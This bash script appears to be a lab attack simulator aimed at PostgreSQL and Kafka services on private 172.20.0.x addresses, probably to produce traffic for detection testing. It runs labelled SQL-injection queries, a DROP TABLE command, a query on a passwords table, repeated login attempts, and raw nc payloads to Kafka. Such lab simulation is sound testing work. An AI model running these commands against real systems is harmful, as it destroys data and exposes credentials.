#!/bin/bash
set -e

echo "=== Starting attacks on victim services ==="

# Используем IP адреса для надежности
POSTGRES_IP="172.20.0.20"
KAFKA_IP="172.20.0.31"

# Атака на PostgreSQL
echo "--- Attacking PostgreSQL ($POSTGRES_IP:5432) ---"
echo "Attempting SQL injection with OR 1=1..."
timeout 3 psql -h $POSTGRES_IP -U postgres -d victimdb -c "SELECT * FROM users WHERE id=1 OR '1'='1';" 2>&1 | head -3 || echo "SQL injection attempt completed"

echo "Attempting SQL injection with UNION SELECT..."
timeout 3 psql -h $POSTGRES_IP -U postgres -d victimdb -c "SELECT * FROM users UNION SELECT * FROM passwords;" 2>&1 | head -3 || echo "UNION SELECT injection attempt completed"

echo "Attempting SQL injection with DROP TABLE..."
timeout 3 psql -h $POSTGRES_IP -U postgres -d victimdb -c "DROP TABLE IF EXISTS users;" 2>&1 | head -3 || echo "DROP TABLE injection attempt completed"

echo "Attempting brute force connection..."
for i in {1..5}; do
  timeout 2 psql -h $POSTGRES_IP -U postgres -d victimdb -c "SELECT 1;" 2>&1 | head -1 && echo "Connection attempt $i succeeded" || echo "Connection attempt $i failed"
  sleep 0.5
done

echo "Attempting unauthorized access with wrong credentials..."
timeout 2 psql -h $POSTGRES_IP -U admin -d victimdb -c "SELECT 1;" 2>&1 | head -1 || echo "Unauthorized access attempt blocked"

# Атака на Kafka (используем IP и простые TCP соединения)
echo "--- Attacking Kafka ($KAFKA_IP:9092) ---"
echo "Attempting unauthorized topic creation (malicious-topic)..."
timeout 3 bash -c "echo -e 'malicious-topic' | nc $KAFKA_IP 9092" 2>&1 | head -2 || echo "Unauthorized topic creation attempt completed"

echo "Attempting protocol exploitation..."
timeout 3 bash -c "echo -ne '\x00\x00\x00\x01\x00' | nc $KAFKA_IP 9092" 2>&1 | head -2 || echo "Protocol exploitation attempt completed"

echo "Attempting message injection..."
timeout 3 bash -c "echo -e 'malicious payload for test-topic' | nc $KAFKA_IP 9092" 2>&1 | head -2 || echo "Message injection attempt completed"

echo "Attempting Kafka connection from attacker..."
timeout 3 bash -c "echo 'test' | nc $KAFKA_IP 9092" 2>&1 | head -2 || echo "Kafka connection attempt completed"

echo "=== Attacks completed ==="
